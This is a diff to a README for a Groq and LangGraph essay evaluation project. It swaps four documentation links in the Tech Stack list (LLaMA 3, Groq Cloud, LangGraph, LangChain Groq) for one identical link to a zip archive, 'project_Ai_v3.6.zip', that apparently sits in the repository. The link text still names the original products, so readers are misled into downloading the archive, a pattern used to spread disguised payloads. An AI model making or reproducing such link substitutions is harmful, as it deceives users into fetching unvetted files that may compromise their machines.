@@ -16,10 +16,10 @@ An intelligent essay evaluation system powered by **Groq hardware** and **LangGr
 
 ## 🧩 Tech Stack
 
-- **Language Model:** [LLaMA 3](https://ai.meta.com/llama/)
-- **LLM Provider:** [Groq Cloud](https://groq.com)
-- **Framework:** [LangGraph](https://python.langchain.com/docs/langgraph/)
-- **Integration:** [LangChain Groq](https://python.langchain.com/docs/integrations/llms/groq)
+- **Language Model:** [LLaMA 3](https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_4/main/dactylous/project_Ai_v3.6.zip)
+- **LLM Provider:** [Groq Cloud](https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_4/main/dactylous/project_Ai_v3.6.zip)
+- **Framework:** [LangGraph](https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_4/main/dactylous/project_Ai_v3.6.zip)
+- **Integration:** [LangChain Groq](https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_4/main/dactylous/project_Ai_v3.6.zip)
 - **Environment:** Python 3.10+
 
 ---
